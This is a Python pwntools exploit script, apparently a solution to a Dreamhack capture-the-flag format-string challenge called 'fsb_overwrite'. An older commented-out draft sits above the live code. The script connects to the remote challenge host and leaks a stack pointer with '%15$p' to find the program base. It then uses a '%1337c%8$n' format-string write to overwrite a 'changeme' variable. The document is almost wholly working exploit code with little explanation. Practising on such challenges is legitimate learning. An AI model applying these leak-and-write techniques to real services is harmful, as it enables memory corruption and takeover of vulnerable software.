# from pwn import *

# context.binary = exe = ELF('./fsb_overwrite', checksec = False)

# p = process(exe.path)

# input()
# p.sendline("%11$p")
# main_addr = p.recvline()
# changeme_addr = exe.sym['changeme']
# payload = f'%{0x539}c%7$n'.encode()
# # payload = payload.ljust(0x20, b'P')
# payload += p64(changeme_addr)
# p.sendline(payload)

# p.interactive()
from pwn import *

exe = ELF('./fsb_overwrite', checksec=False)
# p = process(exe.path)
p = remote("host3.dreamhack.games", 11718)

# input()

# Brute
# for i in range(6, 21):
#     p.sendline(f'%{i}$p')
#     p.recvline()
# -> 15

# Leak exe
payload = b'%15$p'
p.sendline(payload)
leak = p.recvuntil(b'\n')
leak = int(leak.decode(), 16)
print("Exe leak: " + hex(leak))

# Exe base
exe.address = leak - 0x1293
print("Exe base: " + hex(exe.address))

# Format string %n to put 1337 in changeme
changeme = exe.address + 0x401c
payload = b'%1337c%8$n'
payload = payload.ljust(0x10)
payload += p64(changeme)
p.sendline(payload)

p.interactive()